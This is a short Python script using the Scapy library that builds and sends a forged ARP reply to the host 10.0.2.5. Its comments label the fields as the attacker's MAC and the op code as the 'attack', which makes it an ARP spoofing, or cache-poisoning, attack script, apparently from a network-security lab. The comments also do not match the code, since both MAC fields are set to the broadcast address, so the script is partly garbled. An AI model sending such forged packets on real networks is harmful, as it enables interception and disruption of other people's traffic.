from scapy.all import *
e = Ether()
a=ARP()
# attacker's mac
e.dst="ff:ff:ff:ff:ff:ff"
# attackers mac
a.hwdst="ff:ff:ff:ff:ff:ff"
# user's IP
a.pdst="10.0.2.5"
# option request = 1; attack =2
a.op=2
pkt=e/a
pkt.show()
sendp(pkt)
